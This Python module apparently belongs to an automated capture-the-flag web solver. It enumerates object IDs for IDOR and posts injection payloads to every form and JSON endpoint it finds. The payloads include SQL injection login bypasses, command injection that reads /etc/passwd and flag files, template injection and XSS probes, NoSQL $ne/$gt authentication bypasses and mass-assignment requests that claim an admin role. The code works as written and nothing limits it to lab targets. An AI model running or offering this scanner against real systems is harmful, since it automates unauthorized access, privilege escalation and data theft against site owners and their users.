"""Deep interaction pass: enumerate numeric params (IDOR), POST forms and
follow render hints, and fuzz *every* discovered endpoint — not just the
homepage. This is what catches challenges like:

  - /user?id=1 with the flag at id=2        (IDOR enumeration)
  - upload form -> "Render it at /theme?name=..." (form POST + render follow)
  - /api/notes/1 style REST ids             (path-id enumeration)

Heavy use of the keep-alive pool keeps all of this fast.
"""
import html as html_mod
import json
import re
import urllib.parse

from core import httpx
from core.flag import extract_flags
from core.parallel import pmap

# param names that scream "object id"
IDOR_PARAM_RE = re.compile(r"(^|_)(id|user|uid|note|page|item|file|doc|record|entry|profile|account|ticket|order)(_id)?$", re.I)
# paths that end in a numeric segment: /api/users/1, /notes/3
IDOR_PATH_RE = re.compile(r"/([a-z0-9_-]+)/([0-9]{1,5})$", re.I)
RENDER_HINT_RE = re.compile(
    r"(?i)(?:render(?:ed|ing)?|view|open|fetch|serve|display|preview|see|access)(?: it| this| at| here)?"
    r"[:\s]*(?:at\s+)?([\"'`]?(/[a-zA-Z0-9_\-./?=&%]{2,140})[\"'`]?)"
)
URL_IN_TEXT_RE = re.compile(r"[\"']?(/[a-zA-Z0-9_\-./?=&%]{2,140})[\"']?")
INTERESTING_PARAM = re.compile(r"(id|user|uid|name|note|path|file|url|redirect|next|page|q|query|search|cmd|command|token|key|debug)", re.I)


def _links_with_params(html_text, page_url):
    """All same-origin links that carry query params, deduped."""
    parsed = urllib.parse.urlparse(page_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    out = []
    seen = set()
    for m in re.finditer(r'href=["\']([^"\']+)["\']', html_text, re.I):
        u = html_mod.unescape(m.group(1)).strip()
        if not u or u.startswith(("#", "javascript:", "mailto:", "tel:", "data:")):
            continue
        if u.startswith("//"):
            u = parsed.scheme + ":" + u
        if not u.startswith(("http://", "https://")):
            u = urllib.parse.urljoin(origin + parsed.path, u)
        if urllib.parse.urlparse(u).netloc != parsed.netloc:
            continue
        qs = urllib.parse.urlparse(u).query
        if qs and u not in seen:
            seen.add(u)
            out.append(u)
    return out


def _paths_with_numeric_id(html_text, page_url):
    """Links whose last path segment is numeric: /api/users/1, /notes/3."""
    parsed = urllib.parse.urlparse(page_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    out = []
    seen = set()
    for m in re.finditer(r'href=["\']([^"\']+)["\']', html_text, re.I):
        u = html_mod.unescape(m.group(1)).strip()
        if not u or u.startswith(("#", "javascript:", "mailto:")):
            continue
        if not u.startswith(("http://", "https://")):
            u = urllib.parse.urljoin(origin + parsed.path, u)
        if urllib.parse.urlparse(u).netloc != parsed.netloc:
            continue
        path = urllib.parse.urlparse(u).path
        if IDOR_PATH_RE.search(path) and u not in seen:
            seen.add(u)
            out.append(u)
    return out


def idor_enum(base, page_html, max_ids=60, workers=12):
    """Enumerate numeric ids on query params and numeric path segments.

    For each candidate endpoint we fetch ids 1..N and fingerprint the
    responses. Distinct body fingerprints per id = a data-backed object the
    user was not supposed to reach (classic IDOR). Flags are extracted from
    every response. Returns (findings, flags).
    """
    findings = []
    flags = []
    candidates = []

    # 1) query params: /user?id=3
    for u in _links_with_params(page_html, base):
        parsed = urllib.parse.urlparse(u)
        for k, v in urllib.parse.parse_qsl(parsed.query):
            if v.isdigit() and IDOR_PARAM_RE.search(k):
                candidates.append(("param", u, k))
                break
    # 2) numeric path segments: /api/users/1
    for u in _paths_with_numeric_id(page_html, base):
        parsed = urllib.parse.urlparse(u)
        m = IDOR_PATH_RE.search(parsed.path)
        if m:
            candidates.append(("path", u, m.group(2)))

    if not candidates:
        return findings, flags

    def do(cand):
        kind, url, base_val = cand
        seen_fp = {}
        local_flags = []
        local_find = []
        for i in range(1, max_ids + 1):
            if kind == "param":
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
                qs = [(k, str(i) if k == base_val else v) for k, v in qs]
                target = urllib.parse.urlunparse(parsed._replace(
                    query=urllib.parse.urlencode(qs)))
            else:
                parsed = urllib.parse.urlparse(url)
                path = re.sub(r"/[0-9]{1,5}$", f"/{i}", parsed.path)
                target = urllib.parse.urlunparse(parsed._replace(path=path))
            r = httpx.get(target, timeout=6)
            if r is None:
                continue
            known, cands = extract_flags(r.text)
            for f in known + cands:
                if f not in local_flags:
                    local_flags.append(f)
            fp = (r.status, len(r.body), r.headers.get("content-type", ""))
            if fp not in seen_fp:
                seen_fp[fp] = i
            else:
                # same shape as another id — likely a real object lookup
                # (missing ids usually all share one shape)
                pass
        distinct = len(seen_fp)
        if distinct >= 2:
            low = url.split("?")[0]
            local_find.append(f"  [!] IDOR? {url} — {distinct} รูปแบบเนื้อหาต่างกันใน id 1..{max_ids}")
        return local_find, local_flags

    for _, res in pmap(do, candidates, workers=workers, desc="idor enum"):
        if isinstance(res, Exception):
            continue
        find, fl = res
        findings.extend(find)
        flags.extend(fl)
    return findings, list(dict.fromkeys(flags))


# payloads to try in EVERY form field — auth bypass / command / template
_FORM_PAYLOADS = [
    ("sqli", "' OR 1=1 -- ", None),
    ("sqli-alt", '" OR "1"="1', None),
    ("cmdi", ";cat /etc/passwd", "root:x:"),
    ("cmdi2", "$(cat /tmp/flag.txt)", None),
    ("cmdi3", ";cat /tmp/flag.txt", None),
    ("cmdi4", "|cat /etc/passwd", "root:x:"),
    ("ssti", "{{7*7}}", "49"),
    ("ssti-dollar", "${7*7}", "49"),
    ("xss", "<script>alert(1)</script>", None),
]


def form_post(base, page_html, workers=6):
    """POST every form with benign values, a template-probe, and injection
    payloads per field (SQLi auth bypass, command injection, SSTI), then
    follow any 'render at /path?name=x' hint. Returns (findings, flags)."""
    findings = []
    flags = []

    parsed = urllib.parse.urlparse(base)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    forms = []
    for fm in re.finditer(r"<form[^>]*>(.*?)</form>", page_html, re.I | re.S):
        block = fm.group(0)
        am = re.search(r"<form[^>]*action=[\"']([^\"']*)[\"']", block, re.I)
        action = am.group(1) if am else ""
        mm = re.search(r"<form[^>]*method=[\"']([^\"']*)[\"']", block, re.I)
        method = (mm.group(1) if mm else "get").lower()
        if action.startswith("http"):
            target = action
        else:
            target = urllib.parse.urljoin(origin + parsed.path, action)
        fields = []
        for m in re.finditer(
                r"<(?:input|textarea|select)[^>]*name=[\"']([^\"' ]+)[\"']",
                block, re.I):
            n = html_mod.unescape(m.group(1))
            if n not in [f[0] for f in fields]:
                fields.append((n, ""))
        if method == "post":
            forms.append((target, fields))

    if not forms:
        return findings, flags

    def do(form):
        target, fields = form
        local_find = []
        local_flags = []
        benign = {n: "probe_value_123" for n, _ in fields}
        # template-probe on the largest textarea/content field — catches
        # upload-and-render flows that inject the flag via a template var
        probe = dict(benign)
        if fields:
            biggest = max(fields, key=lambda f: 1 if "content" in f[0] or "text" in f[0] or "body" in f[0] or "template" in f[0] else 0)[0]
            probe[biggest] = "<h1>pwn</h1> <%= FLAG %> {{7*7}}"
        for data in (benign, probe):
            r = httpx.post(target, data=data, timeout=8)
            if r is None:
                continue
            known, cands = extract_flags(r.text)
            for f in known + cands:
                if f not in local_flags:
                    local_flags.append(f)
            # follow render hints: "Render it at /theme?name=..."
            hint = None
            for hm in RENDER_HINT_RE.finditer(r.text):
                cand = hm.group(1).strip("\"'` ")
                if cand.startswith("/"):
                    hint = cand
                    break
            if hint is None:
                for um in re.finditer(r"[\"'`]([^\"'` ]*[?&][^\"'` ]{3,120})[\"'`]", r.text):
                    cand = um.group(1)
                    if cand.startswith("/") or cand.startswith("http"):
                        hint = cand
                        break
            if hint:
                if hint.startswith("http"):
                    render_url = hint
                else:
                    render_url = urllib.parse.urljoin(target, hint)
                rr = httpx.get(render_url, timeout=8)
                if rr is not None:
                    known, cands = extract_flags(rr.text)
                    for f in known + cands:
                        if f not in local_flags:
                            local_flags.append(f)
                    local_find.append(f"  [i] form POST {target} -> follow {hint} ({rr.status}, {len(rr.body)}B)")
            elif r.status in (200, 201, 302):
                local_find.append(f"  [i] form POST {target} -> HTTP {r.status} ({len(r.body)}B)")

        # injection payloads per field: SQLi / CMDi / SSTI / XSS
        if fields:
            for name, _ in fields:
                for label, payload, marker in _FORM_PAYLOADS:
                    data = {n: (payload if n == name else "probe_value_123") for n, _ in fields}
                    r = httpx.post(target, data=data, timeout=10)
                    if r is None:
                        continue
                    known, cands = extract_flags(r.text)
                    found_flags = known + cands
                    hit = None
                    if found_flags:
                        hit = f"field={name} payload={label}"
                    elif marker and marker in r.text:
                        hit = f"field={name} payload={label} (เห็น {marker})"
                    elif label == "sqli" and "welcome" in r.text.lower() and "probe_value" not in r.text:
                        hit = f"field={name} SQLi auth-bypass (login ผ่าน!)"
                    elif label == "ssti" and "49" in r.text:
                        hit = f"field={name} SSTI eval {{7*7}} -> 49"
                    if hit:
                        local_find.append(f"  [!] form {target} {hit}")
                        for f in found_flags:
                            if f not in local_flags:
                                local_flags.append(f)
                        # stop after a REAL flag hit; marker-only hits (e.g.
                        # /etc/passwd) keep going so the flag payload runs
                        if found_flags:
                            break
        return local_find, local_flags

    for _, res in pmap(do, forms, workers=workers, desc="form POST"):
        if isinstance(res, Exception):
            continue
        find, fl = res
        findings.extend(find)
        flags.extend(fl)
    return findings, list(dict.fromkeys(flags))


_JSON_PROBES = [
    # mass assignment: register/login with admin over-posted
    ("mass-assign", {"username": "pwn", "password": "pwn",
                     "role": "admin", "admin": True, "isAdmin": True,
                     "is_admin": True}),
    # NoSQL injection: $ne / $gt operators bypass auth
    ("nosql-ne", {"username": {"$ne": None}, "password": {"$ne": None}}),
    ("nosql-gt", {"username": {"$gt": ""}, "password": {"$gt": ""}}),
    ("nosql-role", {"role": {"$ne": None}}),
]


def fuzz_link_params(base, page_html, max_links=25, workers=12):
    """Fuzz the query params of every same-origin link found in the page
    (e.g. /view?file=welcome.html, /fetch?url=https://...). The homepage
    form fuzzer misses these, and they are exactly where LFI/SSRF hide."""
    from . import injections
    links = _links_with_params(page_html, base)[:max_links]
    if not links:
        return [], []
    hits = []
    flags = []

    def do(url):
        local = []
        parsed = urllib.parse.urlparse(url)
        params = sorted({k for k, _ in urllib.parse.parse_qsl(parsed.query)})
        if not params:
            return local
        for test_fn in injections.ALL_TESTS:
            for p in params:
                r = test_fn(url, p, "")
                if r:
                    local.append((url, p, r[0], r[1]))
        return local

    for _, res in pmap(do, links, workers=workers, desc="link param fuzz"):
        if isinstance(res, Exception):
            continue
        for url, p, kind, ev in res:
            hits.append((url, p, kind, ev))
            known, cands = extract_flags(ev)
            flags.extend(known + cands)
    return hits, list(dict.fromkeys(flags))


COMMON_JSON_PATHS = [
    "/api/login", "/api/register", "/api/me", "/api/user", "/api/users",
    "/api/profile", "/api/account", "/api/admin", "/api/update",
    "/login", "/register", "/profile", "/update", "/admin", "/api/session",
]


def json_probe(base, endpoints, max_endpoints=15):
    """POST JSON bodies to discovered + common API endpoints: mass-assignment
    (role: admin) and NoSQL $ne/$gt auth bypass. Returns (findings, flags)."""
    findings = []
    flags = []
    seen_endpoint = set()
    targets = list(endpoints) + [base + p for p in COMMON_JSON_PATHS]
    for ep in targets:
        p = ep.split("?")[0]
        if p in seen_endpoint:
            continue
        seen_endpoint.add(p)
        if p.endswith((".png", ".jpg", ".css", ".js", ".ico", ".woff", ".txt", ".html")):
            continue
        for label, body in _JSON_PROBES:
            r = httpx.post(ep, data=json.dumps(body),
                           headers={"Content-Type": "application/json"},
                           timeout=8)
            if r is None or r.status >= 500:
                continue
            known, cands = extract_flags(r.text)
            new_flags = known + cands
            low = r.text.lower()
            # multi-step mass assignment: POST returns a token -> GET /api/me
            if not new_flags and r.status in (200, 201):
                try:
                    resp_json = json.loads(r.text)
                    token = resp_json.get("token") or resp_json.get("id") or resp_json.get("session")
                except Exception:
                    token = None
                if token and "role" in r.text and "admin" in json.dumps(body):
                    for me in ("/api/me", "/api/user", "/api/profile", "/me", "/profile"):
                        for header in ({"Authorization": f"Bearer {token}"},
                                       {"X-Auth-Token": token}, {"Cookie": f"token={token}"}):
                            rr = httpx.get(base + me, headers=header, timeout=8)
                            if rr is None:
                                continue
                            k2, c2 = extract_flags(rr.text)
                            if k2 + c2:
                                findings.append(
                                    f"  [!] mass-assign {ep}: register กับ role=admin → token → "
                                    f"GET {me} → flag!")
                                flags.extend(k2 + c2)
                                return findings, list(dict.fromkeys(flags))
            # 'welcome/admin' markers alone are too noisy (404 pages mention
            # admin); require a real flag OR a distinctive auth marker
            if new_flags or ("flag" in low and ("admin" in low or "welcome" in low)):
                kind = "mass-assign" if label.startswith("mass") else "NoSQLi"
                if new_flags:
                    findings.append(f"  [!] {kind} {ep}: POST {json.dumps(body)[:60]} → flag!")
                    flags.extend(new_flags)
                elif "flag" in low and "admin" in low:
                    findings.append(f"  [!] {kind} {ep}: POST {json.dumps(body)[:60]} → ได้สิทธิ์ admin")
                break
    return findings, list(dict.fromkeys(flags))


def fuzz_discovered(base, endpoints, max_endpoints=25, workers=12):
    """Run the full injection fuzz on every discovered 200-endpoint
    (each endpoint's own HTML is fetched to find its params)."""
    from . import injections
    hits = []
    flags = []
    endpoints = [e for e in endpoints if not e.endswith(
        (".png", ".jpg", ".jpeg", ".gif", ".css", ".ico", ".js", ".woff", ".woff2", ".svg"))][:max_endpoints]
    if not endpoints:
        return hits, flags

    def do(ep):
        r = httpx.get(ep, timeout=6)
        if r is None:
            return []
        known, cands = extract_flags(r.text)
        found = list(known + cands)
        # only fuzz endpoints that actually take input
        if r.status == 200 and ("<form" in r.text.lower() or "?" in ep or
                                "input" in r.text.lower()):
            h = injections.fuzz_params(ep, r.text)
            for t, p, kind, ev in h:
                found.append(("hit", t, p, kind, ev))
        return found

    for _, res in pmap(do, endpoints, workers=workers, desc="endpoint fuzz"):
        if isinstance(res, Exception):
            continue
        for item in res:
            if isinstance(item, tuple) and item[0] == "hit":
                _, t, p, kind, ev = item
                hits.append((t, p, kind, ev))
            else:
                flags.append(item)
    return hits, list(dict.fromkeys(flags))
